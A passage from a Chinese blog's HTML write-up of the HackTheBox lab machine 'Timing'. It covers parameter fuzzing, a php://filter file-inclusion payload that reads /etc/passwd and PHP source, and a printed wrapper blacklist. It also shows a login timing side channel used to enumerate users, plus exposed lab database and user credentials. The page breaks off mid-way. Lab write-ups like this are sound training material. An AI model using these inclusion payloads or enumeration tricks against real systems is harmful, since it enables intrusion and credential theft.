@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-Timing - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-Timing" />
+<meta property="og:description" content="HackTheBox靶机Timing" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-timing/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-30T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-03-30T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-Timing"/>
+<meta name="twitter:description" content="HackTheBox靶机Timing"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-timing/" /><link rel="prev" href="https://mi3aka.eu.org/htb-meta/" /><link rel="next" href="https://mi3aka.eu.org/cobalt-strike%E5%88%9D%E4%BD%93%E9%AA%8C/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-Timing",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-timing\/"
+        },"genre": "posts","wordcount":  2997 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-timing\/","datePublished": "2022-03-30T14:08:30+00:00","dateModified": "2022-03-30T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-Timing</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-30">2022-03-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2997 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#文件包含读取源代码">文件包含读取源代码</a></li>
+    <li><a href="#获取user权限">获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://app.hackthebox.com/machines/421" target="_blank" rel="noopener noreffer ">https://app.hackthebox.com/machines/421</a></p>
+<h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281626817.png" /></p>
+<p>一个登录框,测试了一下貌似不存在sql注入</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627612.png" /></p>
+<p>目录爆破结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281627521.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281640566.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281642866.png" /></p>
+<p>存在<code>images/upload</code>目录,但是没有爆破出有价值的文件</p>
+<h2 id="文件包含读取源代码">文件包含读取源代码</h2>
+<p>注意到<code>image.php</code>没有直接跳转到<code>login.php</code>,推测该文件可能可以接受参数去读取<code>images</code>文件夹中的文件</p>
+<p><code>wfuzz -c -w ~/SecTools/SecLists-2021.4/Discovery/Web-Content/burp-parameter-names.txt -u &quot;http://10.10.11.135/image.php?FUZZ=/etc/passwd&quot;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648625.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203281648934.png" /></p>
+<p>传入<code>img=index.php</code>时,跳转到<code>login.php</code>,推测这里为文件包含</p>
+<p><code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
+<p><code>/etc/passwd</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin❌2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys❌3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games❌5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network❌100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">syslog❌102:106::/home/syslog:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus❌103:107::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt❌104:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lxd❌105:65534::/var/lib/lxd/:/bin/false
+</span></span><span class="line"><span class="cl">uuidd❌106:110::/run/uuidd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">dnsmasq❌107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">landscape❌108:112::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">pollinate❌109:1::/var/cache/pollinate:/bin/false
+</span></span><span class="line"><span class="cl">sshd❌110:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mysql❌111:114:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">aaron❌1000:1000:aaron:/home/aaron:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>image.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_safe_include</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">,</span> <span class="s2">&#34;phar://&#34;</span><span class="p">,</span> <span class="s2">&#34;zip://&#34;</span><span class="p">,</span> <span class="s2">&#34;ftp://&#34;</span><span class="p">,</span> <span class="s2">&#34;file://&#34;</span><span class="p">,</span> <span class="s2">&#34;http://&#34;</span><span class="p">,</span> <span class="s2">&#34;data://&#34;</span><span class="p">,</span> <span class="s2">&#34;expect://&#34;</span><span class="p">,</span> <span class="s2">&#34;https://&#34;</span><span class="p">,</span> <span class="s2">&#34;../&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">&#34;/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_safe_include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hacking attempt detected!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>login.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;header.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">createTimeChannel</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;db_conn.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: ./index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$statement</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM users WHERE username = :username&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">createTimeChannel</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: ./index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$errorMessage</span> <span class="o">=</span> <span class="s2">&#34;Invalid username or password entered&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">...
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>注意这里有一个<code>createTimeChannel</code>,当用户名正确时后不会直接回显,而是延迟回显类似于延时注入</p>
+</blockquote>
+<p><code>db_conn.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=app&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;4_V3Ry_l0000n9_p422w0rd&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>传入<code>user=admin&amp;password=4_V3Ry_l0000n9_p422w0rd</code>,成功延迟了一秒钟,但是没有进行跳转,说明存在用户<code>admin</code>,但是密码没整出来</p>
+<p>在<code>/etc/passwd</code>中存在<code>aaron</code>用户,尝试登录,也成功延迟了一秒钟,说明存在该用户</p>
+<p>测试得知<code>aaron</code>作为密码可以登录<code>aaron</code>用户</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203290028037.png"
